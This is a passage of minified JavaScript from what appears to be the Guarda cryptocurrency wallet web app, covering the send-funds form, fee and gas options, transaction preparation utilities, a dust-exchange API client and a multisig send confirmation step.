                    max: st,
                    roundDown: !0
                }))
            }
            function handleRetryLoadAdapter() {
                re(!1);
                q(!1)
            }
            const ra = (0,
            O.useMemo)(( () => (De !== $D || !(null === Te || "" === Le || "0" === Le || null === Ie || null !== Te && isLunaWithZeroBalance(Te))) && (De !== jD || 0 !== g.length && "" !== Le && "0" !== Le)), [Ie, g, Le]);
            if (!Te && !u.length)
                return O.createElement("div", {
                    className: CD
                }, O.createElement(DashboardMenu, null), O.createElement(empty_wallets, null));
            const la = (0,
            O.useCallback)(( () => Kt && ("dot" !== (null == Ie ? void 0 : Ie.currency) || (0,
            Ko.lt)(pe, 1) && !Mt) && O.createElement(ui_message, {
                type: "warning"
            }, "You are sending funds to an inactive account. According to the network's requirements, the minimum transfer amount to an inactive account is", " ", Vt, " ", null == Ie ? void 0 : Ie.currency.toUpperCase(), ".")), [Kt, Vt, Ie, pe, Mt]);
            return O.createElement("div", {
                className: CD
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Instantly send your coins or tokens"), Ie && Ie.multisigId && O.createElement(message, null, "You are sending funds to Multisig address. Keep in mind that you must have the confirmation of other participants to manage the funds."), O.createElement(_m, {
                wallet: Te,
                type: Jd,
                className: TD
            })), O.createElement("div", {
                className: ND
            }, O.createElement(sf(), {
                ref: c
            }, O.createElement(_m, {
                wallet: Te,
                type: Hd
            }), O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: Te
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && z,
                    message: a
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != Te ? Te : void 0,
                    wallets: Re,
                    onChange: ze,
                    customFilter: Je,
                    withoutWatchOnly: !0,
                    withMultisigs: !0,
                    noWalletsToShow: !Re.length && !Te,
                    isNewSelector: !0,
                    isSelectorWithoutValue: !0
                }))
            }
            )), O.createElement(label, null, "To", O.createElement(LabelAction, {
                onClick: Ke
            }, Qe())), De === jD && O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                rules: zf.selfAddress,
                value: {
                    isValidAddress: J,
                    isSelfAddress: te,
                    addressTo: g
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && z,
                    message: a
                }, O.createElement(mE, {
                    value: g,
                    wallet: Te,
                    onValidate: $e,
                    onPartnerAddress: Xe,
                    onAdapterError: Ye,
                    adapterError: ne,
                    onLoadingRecognize: qe,
                    onChange: je,
                    onEnter: handleNext,
                    className: UD
                }))
            }
            )), !g && O.createElement(qr_scanner_paste_button, {
                setAddress: y
            }), Ce && O.createElement("div", {
                className: WD
            }, O.createElement(LoaderDots, {
                visible: !0
            })), !Ce && Te && (we || ve) && O.createElement("div", {
                className: FD
            }, O.createElement("span", null, "Recognized ", (0,
            be.xG)(Te.currency), " Address:"), O.createElement("p", null, we || ve))), De === $D && O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: Ie
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && z,
                    message: a
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != Ie ? Ie : void 0,
                    wallets: Be,
                    onChange: He,
                    withMultisigs: !0,
                    customFilter: onFilterWallets,
                    sendToWallets: null == Te ? void 0 : Te.currency.toUpperCase(),
                    isNewSelector: !0,
                    notSortByCmc: !0,
                    isSelectorWithoutValue: !0
                }))
            }
            )), It && !v && O.createElement("div", {
                className: LD,
                onClick: () => _(!0)
            }, "Add ", Lt), It && v && O.createElement(O.Fragment, null, O.createElement(label, null, Lt), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: k,
                rules: [...zf.extraId(na)]
            }, (e => {
                var t;
                let {isValid: a, message: n} = e;
                return O.createElement(pa, {
                    isInvalid: !a && Boolean(z) || !!qt.extraId,
                    message: n || (null === (t = qt.extraId) || void 0 === t ? void 0 : t.reason)
                }, O.createElement(Ea, {
                    onEnter: handleNext,
                    placeholder: `Enter ${Lt}`,
                    value: k,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return S(t)
                    }
                }))
            }
            )), !k && O.createElement("div", {
                className: ID
            }, O.createElement(Pf, {
                onScan: S
            })), !(null == et || !et.generateExtraID) && O.createElement("div", {
                className: LD,
                onClick: () => S(et.generateExtraID())
            }, "Generate ", Lt))), O.createElement(label, null, "Amount", Te && h(Te) && O.createElement(SD, {
                wallet: Te,
                onChange: N,
                selected: (0,
                be.xG)(C)
            })), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: (0,
                Ko.y4)(Le),
                rules: [...zf.amount(Qt), ...zf.dotMinimalBalance(aa), ...zf.nearMinimalBalance(aa), ...zf.adaMinimalBalanceAndAmount(aa)]
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && Boolean(z || (null == a ? void 0 : a.includes("Reduce the number (max"))),
                    message: a
                }, O.createElement(Ea, {
                    onEnter: handleNext,
                    className: GD,
                    name: "lastpass-fix-search",
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return handleChangeAmount(t)
                    }
                    ,
                    value: Le,
                    placeholder: "0"
                }))
            }
            )), O.createElement(ED, {
                fromWallet: Te,
                toCurrency: C,
                amount: Le
            })), Te && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: () => handleChangeAmountFromMax(ct || "0")
            }, O.createElement("span", {
                className: MD
            }, (0,
            Ko.yF)(ct)), " ", (0,
            be.xG)(null != C ? C : void 0))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, Te && (null !== (l = (null == Te ? void 0 : Te.family) || (null == Te ? void 0 : Te.currency)) && void 0 !== l && l.startsWith("hbar") || "trx" === (null == Te ? void 0 : Te.family) && "trx" !== (null == Te ? void 0 : Te.currency)) ? "Estimated network fee" : "Network fee", ":"), ra ? O.createElement(MiskInfoValue, {
                disabled: null == _t || !de
            }, O.createElement("span", {
                className: MD
            }, (0,
            Ko.yF)(_t)), vt && " " + (0,
            be.iX)(vt) || " " + (0,
            be.xG)(null == at ? void 0 : at.currency)) : "—"), Dt && O.createElement(O.Fragment, null, !!parseInt(Te.balance) && O.createElement(O.Fragment, null, O.createElement(ui_message, {
                type: "warning"
            }, !parseInt(Wt.energyAvailable) && O.createElement(O.Fragment, null, "Some TRX will be burned to make a transaction. You can ") || O.createElement(O.Fragment, null, "Not enough resources to pay the network fee. Some TRX will be burned to make a transaction. You can "), O.createElement("a", {
                onClick: handleGoTronStaking
            }, "stake more TRX"), " to get Energy."))), xt && ce && O.createElement(ui_message, {
                type: "info"
            }, "To ensure swift tx confirmation relatively high miner fee applied (", (0,
            Ko.yF)(f(null != ht ? ht : void 0, null != at ? at : void 0, Ee), ["btc", "eth"].includes(Ee) ? 4 : 2), " ", (0,
            be.xG)(Ee), " equivalent). You can adjust fee in advanced options. ", O.createElement("a", {
                href: "https://support.guarda.com/assets/how-network-fees-are-calculated",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "How fee is calculated", O.createElement("img", {
                src: dD,
                className: RD,
                alt: ""
            }))), la(), Te && isLunaWithZeroBalance(Te) && O.createElement(ui_message, {
                type: "warning"
            }, "Minimum balance to calculate fee must be greater than 0"), "sol" === (null == Te ? void 0 : Te.family) && null != yt && yt.extraFee ? O.createElement(ui_message, {
                type: "info"
            }, "To send to this address, you need to pay a fee of ", yt.extraFee, " SOL for creating a token at this address") : null, Le && Mt && !Gt && O.createElement(ui_message, {
                type: "error"
            }, "You need at least 1 DOT on the balance after paying the Network fees, according to the DOT rules."), Ut && !Mt && !Gt && O.createElement(ui_message, {
                type: "warning"
            }, "Balance after the operation: less than 1 DOT. Polkadot archives addresses with a balance of less than 1 DOT with a loss of funds. We recommend changing the amount"), $t ? O.createElement(DustUtxoRemaining, null) : null, Zt ? O.createElement(NoValidUtxo, null) : null, Rt && z && O.createElement(ui_message, {
                type: "error"
            }, Xt ? O.createElement(O.Fragment, null, "Insufficient ", null == at ? void 0 : at.currency.toUpperCase(), " balance to pay the miner's fee. You need ", null != yt && yt.extraFee && _t ? (0,
            Ko.PD)(_t, null == yt ? void 0 : yt.extraFee) : _t, " ", null == at ? void 0 : at.currency.toUpperCase(), ".", " ", "Available balance: ", K, " ", null == at ? void 0 : at.currency.toUpperCase(), ".", " ", O.createElement("a", {
                href: "https://support.guarda.com/assets/how-to-send-tokens",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Why do I need ", null == at ? void 0 : at.currency.toUpperCase(), "? ", O.createElement(VA, {
                src: uD,
                alt: "Open Link"
            }))) : "Insufficient funds to send the amount and pay the Network fee. Please reduce the amount."), ne && Y && O.createElement(ui_message, {
                type: "error"
            }, "Network error. Please ", O.createElement("a", {
                onClick: handleRetryLoadAdapter
            }, "try again")), Te && "geth" === Te.currency && O.createElement(O.Fragment, null, O.createElement("p", {
                className: OD
            }, "GETH token is a collateral for staked ETH and gives the right to receive staking rewards starting from 0.1 GETH."), O.createElement(lf.ValidatorField, {
                rules: zf.bool,
                value: he
            }, (e => {
                let {isValid: t} = e;
                return O.createElement("div", {
                    className: "relative"
                }, O.createElement(tooltip, {
                    visible: !t && z,
                    text: "Please Accept Terms of Use"
                }), O.createElement(mp, {
                    onChange: () => ge(!he),
                    checked: he,
                    className: BD
                }, "I will not be able to return staked ETH and receive rewards for ", Le, " GETH. If I have less than 0.1 GETH, I will not receive any staking rewards."))
            }
            ))), xt && !w && O.createElement("div", {
                className: PD
            }, O.createElement("span", {
                onClick: Ve,
                className: "dashedNormal"
            }, "Advanced options")), xt && w && O.createElement("div", {
                className: PD
            }, O.createElement("span", {
                onClick: Ve,
                className: "dashedNormal"
            }, "Hide advanced options")), Ct && w && O.createElement(O.Fragment, null, O.createElement(label, null, "Gas Price"), O.createElement(lf.ValidatorField, {
                value: T,
                rules: Yt ? [] : zf.amount(ea)
            }, (e => {
                var t;
                let {isValid: a} = e;
                return O.createElement(pa, {
                    top: -43,
                    isInvalid: !a && z || !!qt.gasPrice,
                    message: (null === (t = qt.gasPrice) || void 0 === t ? void 0 : t.reason) || "Gas price must be a positive integer"
                }, O.createElement(iD, {
                    wallet: Te,
                    gasLimit: x,
                    gasPrice: T,
                    onChange: pt
                }))
            }
            )), O.createElement(label, null, "Gas Limit"), O.createElement(lf.ValidatorField, {
                value: x,
                rules: Yt ? [] : zf.amount(ta)
            }, (e => {
                var t;
                let {isValid: a} = e;
                return O.createElement(pa, {
                    isInvalid: !a && z || !!qt.gasLimit,
                    message: (null === (t = qt.gasLimit) || void 0 === t ? void 0 : t.reason) || "Gas limit must be greater than 21000 / must be a positive integer"
                }, O.createElement(Ea, {
                    onEnter: handleNext,
                    onChange: dt,
                    value: x
                }))
            }
            ))), Tt && w && O.createElement(O.Fragment, null, O.createElement(label, null, "Satoshi per Byte"), O.createElement(lf.ValidatorField, {
                value: P,
                rules: zf.amount(ea)
            }, (e => {
                let {isValid: t} = e;
                return O.createElement(pa, {
                    isInvalid: !t && z && Boolean(P),
                    message: "The value must be a positive integer"
                }, O.createElement(oD, {
                    wallet: Te,
                    feePerByte: P,
                    onChange: L
                }))
            }
            ))), At && w && O.createElement(O.Fragment, null, O.createElement(label, null, "Fee"), O.createElement(lf.ValidatorField, {
                value: _t,
                rules: zf.amount(Jt)
            }, (e => {
                let {isValid: t} = e;
                return O.createElement(pa, {
                    isInvalid: !t && z,
                    message: "The value must be a positive integer"
                }, O.createElement(cD, {
                    feeWallet: at,
                    value: String(null === F ? null != _t ? _t : 0 : null != F ? F : 0),
                    defaultValue: String(null != ht ? ht : 0),
                    onChange: wt
                }))
            }
            ))), Nt && w && O.createElement(O.Fragment, null, O.createElement(label, null, "Nonce (Optional)"), O.createElement(lf.ValidatorField, {
                required: !1,
                value: R,
                rules: zf.nonceValidation()
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && z,
                    message: a
                }, O.createElement(Ea, {
                    placeholder: "0",
                    onChange: mt,
                    value: R
                }), O.createElement("span", {
                    className: DD
                }, "Leave empty to set Nonce automatically"))
            }
            ))), Boolean(_t) && Te && ra && O.createElement(lf.ValidatorField, {
                rules: zf.minimalFee({
                    minimalFee: ie,
                    currency: Te.currency
                }),
                value: _t
            }, (e => {
                let {isValid: t, message: a} = e;
                return t ? O.createElement(O.Fragment, null) : O.createElement(ui_message, {
                    type: "error"
                }, a)
            }
            )), (ra || Tt) && (ra ? O.createElement(lf.ValidatorField, {
                rules: zf.haveFee(de),
                value: _t
            }, (e => {
                let {isValid: t, message: a} = e;
                return !t && z && ye ? O.createElement(ui_message, {
                    type: "warning"
                }, a) : O.createElement(O.Fragment, null)
            }
            )) : O.createElement(lf.ValidatorField, {
                rules: zf.haveFeePerByte(),
                value: P
            }, (e => {
                let {isValid: t, message: a} = e;
                return !t && z && ye ? O.createElement(ui_message, {
                    type: "warning"
                }, a) : O.createElement(O.Fragment, null)
            }
            ))), O.createElement(lf.ValidatorField, {
                rules: zf.isOnline(),
                value: ye
            }, (e => {
                let {isValid: t, message: a} = e;
                return !t && z ? O.createElement(ui_message, {
                    type: "error"
                }, a) : O.createElement(O.Fragment, null)
            }
            )), O.createElement("div", {
                className: AD
            }, O.createElement("div", {
                className: xD
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                id: "confirmSend"
            }, "Next")))))
        }
        const YD = ["eth", "etc", "clo"]
          , qD = undefined
          , ledger_token_info = e => {
            let {parentWallet: t} = e;
            const a = Boolean(t.hw)
              , n = YD.includes(t.currency)
              , r = undefined;
            return a && n ? O.createElement(ui_message, null, "You need to update your", " ", O.createElement("a", {
                rel: "noopener noreferrer",
                target: "_blank",
                href: "https://support.ledger.com/hc/en-us/articles/360002731113-Update-device-firmware"
            }, "Ledger firmware"), ` to the latest version to make this transaction.\n          After you install the latest version turn on\n          the Contract data: ${t.currency.toUpperCase()} App -> Settings -> Contract data -> Yes.`) : null
        }
          , ext_message = function(e) {
            let {type: t, ...a} = e
              , n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null;
            const r = {
                type: t,
                data: a,
                sender: "guarda"
            };
            n && Object.assign(r, {
                host: n
            });
            window.parent.postMessage(r, "*")
        }
          , XD = ee.P.create({
            name: "duster"
        })
          , QD = M.CM ? (0,
        bu.ZP)("duster-root-url") : null;
        QD && XD.log("now use api:", QD);
        const JD = "https://duster.guarda.com"
          , eM = Jf().create({
            baseURL: `${QD || JD}/api/v2`
        });
        function send_utils_defineProperty(e, t, a) {
            (t = send_utils_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function send_utils_toPropertyKey(e) {
            var t = send_utils_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function send_utils_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const isNotEmpty = e => void 0 !== e && !Number.isNaN(e) && "undefined" !== e && "NaN" !== e;
        class SendUtils {
            constructor() {
                send_utils_defineProperty(this, "prepareTxDataParams", ( (e, t, a) => {
                    var n, r;
                    const l = {
                        amount: a.amount,
                        currencyFrom: e.currency,
                        isFeeIncluded: a.isFeeIncluded,
                        addressFrom: null !== (n = null == e ? void 0 : e.tokenAddress) && void 0 !== n ? n : e.address,
                        addressTo: t.accountName || t.address,
                        totalBalance: e.balance,
                        privateKey: e.privateKey,
                        subWallets: e.subWallets,
                        fee: a.fee,
                        exchangeId: a.exchangeId,
                        derivePath: e.derivePath,
                        config: e.config,
                        sendTtype: a.type,
                        accountIndex: null === (r = e.derivedFromMnemonicUsing) || void 0 === r ? void 0 : r.accountIndex
                    };
                    isNotEmpty(a.gasLimit) && Object.assign(l, {
                        gasLimit: +a.gasLimit
                    });
                    isNotEmpty(a.gasPrice) && Object.assign(l, {
                        gasPrice: +a.gasPrice
                    });
                    isNotEmpty(a.feePerByte) && Object.assign(l, {
                        feePerByte: +a.feePerByte
                    });
                    isNotEmpty(a.nonce) && Object.assign(l, {
                        nonce: +a.nonce
                    });
                    isNotEmpty(a.additionalOutput) && Object.assign(l, {
                        additionalOutput: a.additionalOutput
                    });
                    isNotEmpty(a.extraId) && Object.assign(l, {
                        extraId: a.extraId
                    });
                    isNotEmpty(a.derivePath) && Object.assign(l, {
                        derivePath: a.derivePath
                    });
                    isNotEmpty(a.config) && Object.assign(l, {
                        config: a.config
                    });
                    isNotEmpty(a.amountInUsd) && Object.assign(l, {
                        amountInUsd: a.amountInUsd
                    });
                    isNotEmpty(a.currencyTo) && Object.assign(l, {
                        currencyTo: a.currencyTo
                    });
                    isNotEmpty(a.staking) && Object.assign(l, {
                        staking: a.staking
                    });
                    e.smartContract && Object.assign(l, {
                        smartContract: e.smartContract
                    });
                    return l
                }
                ));
                send_utils_defineProperty(this, "getApi", (async (e, t, a) => {
                    const n = e.hw || t.hw
                      , r = undefined;
                    return {
                        api: n ? await Fp.Z.getApiByWallet(e) : await Se.Z.getApiByWallet(e, a),
                        isHardWallet: n
                    }
                }
                ));
                send_utils_defineProperty(this, "dustExchange", (async (e, t, a, n) => {
                    const {api: r} = await this.getApi(e, a)
                      , l = this.prepareTxDataParams(e, t, n);
                    if (!r.generateRawTransaction)
                        return {
                            error: "generateRawTransaction not found"
                        };
                    try {
                        const {rawTransaction: e, hash: t, rawTxObj: a} = await r.generateRawTransaction(l)
                          , s = {
                            id: n.invoiceId,
                            exchangeRawTx: e
                        };
                        a && Object.assign(s, {
                            exchangeRawTxObj: a
                        });
                        const {data: i} = await eM.post("/invoice/confirm", s);
                        return "REJECTED" === i.status ? {
                            error: "Failed to process fee transaction"
                        } : {
                            hash: t
                        }
                    } catch (e) {
                        return {
                            error: "Failed create tx"
                        }
                    }
                }
                ));
                send_utils_defineProperty(this, "preprocessDustExchange", (async (e, t, a, n, r) => {
                    try {
                        const {data: e} = await eM.post("/invoice/preconfirm", {
                            id: n.invoiceId,
                            extraData: {}
                        }, {
                            headers: {
                                code: r
                            }
                        });
                        return e && e.status && "REJECTED_PREPROCESSED" === e.status ? {
                            error: "Failed create tx"
                        } : e
                    } catch (e) {
                        return {
                            error: "Failed create tx"
                        }
                    }
                }
                ));
                send_utils_defineProperty(this, "send", (async (e, t, a, n, r, l) => {
                    const {api: s, isHardWallet: i} = await this.getApi(t, n, l)
                      , o = this.prepareTxDataParams(t, a, r)
                      , c = (null == n ? void 0 : n.uuid) !== (null == t ? void 0 : t.uuid);
                    try {
                        if ("exchange" === e || "loan" === e) {
                            const t = undefined;
                            if (!await s.validateAddress({
                                address: a.address,
                                currency: a.currency
                            })) {
                                let t = ge.d.FAILED_VALIDATE_ADDRESS;
                                "loan" === e && (t = ge.d.FAILED_SEND_LOAN_ADDRESS);
                                "exchange" === e && (t = ge.d.FAILED_SEND_EXCHANGE_ADDRESS);
                                ge.b.error(t, {
                                    currency: a.currency
                                }, ge.d.FAILED_VALIDATE_ADDRESS, {
                                    ...o,
                                    currency: a.currency
                                });
                                throw new Error(`Invalid addressTo for ${a.currency}`)
                            }
                        }
                        const n = await s.sendTransaction(o);
                        let l = t.address;
                        const u = {
                            extra: {}
                        };
                        if (i && t.type === we.uQ.BTC_LIKE_SEGWIT_WALLET) {
                            l = t.title;
                            Object.assign(u, {
                                extra: {
                                    fromWalletUuid: t.uuid
                                }
                            })
                        }
                        if (n.error)
                            return {
                                error: n.error
                            };
                        "exchange" === e && Object.assign(u.extra, {
                            familyFrom: t.family || t.currency,
                            familyTo: a.family || a.currency
                        });
                        if ("sell" === e) {
                            Object.assign(u, {
                                type: e,
                                extra: u.extra || {}
                            });
                            Object.assign(u.extra, r.payment);
                            Object.assign(u.extra, {
                                amountFrom: r.amount,
                                amountTo: r.estimate
                            })
                        }
                        const d = r.isFeeIncluded || c ? u.amount || r.amount : (0,
                        Ko.PD)(u.amount || r.amount, r.fee).toString()
                          , m = l
                          , p = a.address;
                        Object.assign(u, {
                            hash: n.hash,
                            currencyFrom: t.currency,
                            currencyTo: a.currency,
                            addressFrom: m,
                            addressTo: p,
                            isIncoming: !1,
                            family: t.family,
                            amount: m.toLowerCase() !== p.toLowerCase() ? d : "0",
                            extra: {
                                ...u.extra
                            }
                        });
                        ext_message({
                            type: "hash",
                            ...u
                        });
                        return {
                            pendingTx: u,
                            hash: n.hash,
                            extraData: n.extraData,
                            encodedExtraData: n.encodedExtraData
                        }
                    } catch (e) {
                        return {
                            error: "Failed create tx"
                        }
                    }
                }
                ))
            }
        }
        const tM = new SendUtils
          , aM = "insufficient-balance-error_updateBalanceLink_1EUns"
          , InsufficientBalanceError = e => {
            let {wallet: t} = e;
            return O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(t.currency), " balance to pay the miner's fee. Available balance: ", t.balance, " ", (0,
            be.xG)(t.currency), ". ", O.createElement("a", {
                href: "https://support.guarda.com/assets/how-to-send-tokens",
                className: aM,
                target: "_blank",
                rel: "noreferrer noopener"
            }, `Why do I need ${(0,
            be.xG)(t.currency)}?`), " ", O.createElement("img", {
                src: uD,
                alt: ""
            }))
        }
        ;
        InsufficientBalanceError.propTypes = {
            wallet: as().object
        };
        const nM = InsufficientBalanceError
          , rM = a.p + "9c11dcf9c92207b4d779de454a2477f4.svg"
          , lM = a.p + "577f5982768caecc4b3aacb06b7771a6.svg"
          , sM = "confirm_wrapper_v0rx- app_wrapperBlock_2EpA3"
          , iM = "confirm_wrapperForm_3wDBj app_wrapperLeftBlock_3QLZp"
          , oM = "confirm_lock_2CwvX"
          , cM = "confirm_wrapperCenterForm_15AVX app_wrapperCenterBlock_bcslh"
          , uM = "confirm_headerTitles_sMNxV"
          , dM = "confirm_separator_2nE9i"
          , mM = "confirm_isConfirmError__FRdV"
          , pM = "confirm_flickerAnimation_1HgDd"
          , fM = "confirm_footerBlock_3JqEX"
          , EM = "confirm_stepInfo_39BBo"
          , hM = "confirm_buttonsWrapper_34O16"
          , gM = "confirm_feeInfoToggle_2Yr6J"
          , yM = "confirm_loaderWrapper_f0XDT"
          , vM = "confirm_updateBalanceLink_25Ujr"
          , _M = "confirm_errorParams_3NocW"
          , wM = "confirm_topUpWalletLink_1ANrW"
          , bM = "confirm_userSelect_1NW1X"
          , kM = "confirm_tokenInfoBlock_3Fg88"
          , SM = "confirm_tokenInfoBlockItem_2Gj5a"
          , CM = "lock-form_wrapper_3oJbJ"
          , NM = "lock-form_container_3X9s0";
        function LockPasswordLabel(e) {
            const t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)(!0)
              , [r,l] = (0,
            O.useState)(!0)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)("")
              , [u,d] = (0,
            O.useState)(!1)
              , m = (0,
            O.useRef)(null)
              , p = (0,
            j.k6)();
            (0,
            O.useEffect)(( () => {
                t(getSecureData(et)).then((t => {
                    void 0 === t && (t = !1);
                    l(!1);
                    n(t);
                    e.onChangeStatus(t)
                }
                ))
            }
            ), []);
            if (r)
                return null;
            if (!a || !e.showLockPasswordLabel)
                return null;
            function handleUnlock() {
                const a = t(checkMasterPassword(o));
                if (a) {
                    n(!1);
                    e.onChangeStatus(!1, a)
                } else {
                    i(!0);
                    d(!0);
                    c("");
                    null == m || m.current.focus()
                }
            }
            function handleChangePassword(e) {
                let {target: {value: t}} = e;
                c(t);
                i(!1);
                d(!1)
            }
            function goBack() {
                const t = e.back || "/app"
                  , n = objectToString(e.params);
                e.onChangeStatus(a);
                return t && n ? p.push({
                    pathname: t,
                    search: n
                }) : p.push(t)
            }
            return O.createElement("div", {
                className: CM
            }, O.createElement("div", {
                className: NM
            }, O.createElement("p", null, "Enter your Guarda password to confirm the transaction"), O.createElement(sf(), null, O.createElement(lf.ValidatorField, {
                value: !s,
                rules: zf.bool
            }, (e => {
                let {isValid: t} = e;
                return O.createElement(pa, {
                    isInvalid: !t && u,
                    message: "Wrong password"
                }, O.createElement(Ea, {
                    ref: m,
                    value: o,
                    onEnter: handleUnlock,
                    onChange: handleChangePassword,
                    autoFocus: !0,
                    type: "password",
                    placeholder: "Enter the password"
                }))
            }
            ))), O.createElement(Yl, {
                color: "blue",
                onClick: handleUnlock
            }, "Unlock"), O.createElement(Yl, {
                color: "blue",
                onClick: goBack
            }, "Cancel")))
        }
        LockPasswordLabel.propTypes = {
            onChangeStatus: as().func,
            back: as().string,
            params: as().any,
            showLockPasswordLabel: as().bool
        };
        const TM = "included"
          , AM = "excluded"
          , xM = "smartContract";
        let IM = !1;
        const BoardSendConfirm = () => {
            var e, t, a, n;
            const r = useLocationSearch()
              , l = (0,
            j.k6)()
              , s = (0,
            j.TH)()
              , i = (0,
            $.v9)(selectedCache)
              , o = (0,
            $.I0)()
              , c = (0,
            $.v9)($c)
              , u = (0,
            $.v9)(eu)
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)(!1)
              , [E,h] = (0,
            O.useState)(null)
              , [g,y] = (0,
            O.useState)(null)
              , [v,_] = (0,
            O.useState)(!1)
              , [w,b] = (0,
            O.useState)(i.feeStatus || AM)
              , {convertToFiat: k} = useConverter()
              , {localCurrency: S} = local_currency_useLocalCurrency()
              , [C,N] = (0,
            O.useState)(null)
              , [T,A] = (0,
            O.useState)(null)
              , [x,I] = (0,
            O.useState)(!0)
              , [P,L] = (0,
            O.useState)(null)
              , [F,W] = (0,
            O.useState)("0")
              , [R,B] = (0,
            O.useState)(!1)
              , [D,G] = (0,
            O.useState)(!1)
              , [V] = fee_wallet(null != T ? T : void 0)
              , K = (0,
            $.v9)(Fi)
              , [H,z] = (0,
            O.useState)(!1)
              , [Z,Y,q,X] = use_fee(null != T ? T : void 0, null != C ? C : void 0, r.amount, {
                totalBalance: T ? T.balance : void 0,
                privateKey: T ? T.privateKey : void 0,
                gasLimit: r.gasLimit,
                gasPrice: r.gasPrice,
                feePerByte: Number(null !== (e = r.feePerByte) && void 0 !== e ? e : "NaN"),
                extraId: r.extraId
            }, "send")
              , Q = r.manualFee || Z
              , J = (null == V ? void 0 : V.uuid) === (null == T ? void 0 : T.uuid)
              , setProcess = async e => {
                h(e);
                return new Promise((e => setTimeout(e, 200)))
            }
              , ee = null != T && T.multisigId ? T.walletType === xM ? AM : TM : w === AM && (0,
            Ko.gt)((0,
            Ko.PD)(r.amount, Q), F) && J ? TM : w
              , te = (null == V ? void 0 : V.uuid) !== (null == T ? void 0 : T.uuid)
              , ae = !r.resource && Q && ee === TM && (0,
            Ko.gt)(Q, r.amount) && !te
              , ne = r.resource || ee !== TM || te || !Q ? r.amount : (0,
            Ko.h9)(r.amount, Q).toString()
              , re = "ada" === (null == T ? void 0 : T.currency) || "ada-shelley" === (null == T ? void 0 : T.currency)
              , le = ee === AM && !te && Q ? (0,
            Ko.PD)(r.amount, Q).toString() : r.amount
              , se = (0,
            Ko.h9)(null == T ? void 0 : T.balance, le)
              , ie = re && (0,
            Ko.lt)(se, 1)
              , oe = re && (0,
            Ko.lt)(ne, 1)
              , ce = re && (0,
            Ko.eq)(se, 0)
              , {isWarning: ue} = useMinimalBalanceCheck({
                wallet: T,
                estimate: r.amount,
                operationType: zD.minus
            })
              , de = (0,
            O.useCallback)((async e => {
                try {
                    if (!T || !C)
                        return;
                    const i = T
                      , u = await Se.Z.getApiByMultisig(i);
                    await setProcess("Preparing transaction...");
                    let d;
                    if (i.walletType === we._h.ETHEREUM) {
                        var t, a;
                        const e = i.participants.map((e => e.data))
                          , n = c.filter((t => e.includes(t.address)))[0]
                          , l = {
                            amount: (0,
                            Ko.yF)(ne),
                            currencyFrom: i.currency,
                            addressFrom: n.address,
                            privateKey: n.privateKey,
                            contractAddress: i.address,
                            transactionHash: i.transactionHash,
                            destination: C.address,
                            gasLimit: Number(null !== (t = r.gasLimit) && void 0 !== t ? t : "NaN"),
                            gasPrice: Number(null !== (a = r.gasPrice) && void 0 !== a ? a : "NaN")
                        };
                        d = await u.sendMultisigTransaction(l)
                    } else {
                        var n;
                        const e = {
                            amount: r.amount,
                            currencyFrom: i.currency,
                            totalBalance: i.balance,
                            multisigPubKeys: i.participants.map((e => e.data)),
                            addressFrom: i.address,
                            addressTo: C.accountName || C.address,
                            minimumSigAmount: i.minimumSigAmount,
                            privateKey: i.privateKey,
                            fee: Q,
                            isFeeIncluded: TM,
                            feePerByte: Number(null !== (n = r.feePerByte) && void 0 !== n ? n : "NaN")
                        };
                        d = await u.prepareSendMultisigTransaction(e)
                    }
                    if (d.error) {
                        y("Failed create tx");
                        f(!1);
                        return
                    }
                    {
                        const e = tM.prepareTxDataParams(T, C, r)
                          , t = {
                            amount: r.amount,
                            amountInUsd: r.amountInUsd,
                            gasLimit: r.gasLimit,
                            gasPrice: r.gasPrice,
                            balance: i.balance,
                            currency: i.currency,
                            addressFrom: e.addressFrom,
                            addressTo: e.addressTo,
                            fee: e.fee,
                            totalBalance: e.totalBalance,
                            isFeeIncluded: e.isFeeIncluded
                        };
                        ge.b.success(ge.d.SEND_SUCCESS, {
                            currency: t.currency
                        }, "false", t)
                    }
                    const {data: m} = await U.nW.post("/api/v1/internal/multisigs/transactions/new", d);
                    m.transactionId;
                    const p = {
                        type: "multisig",
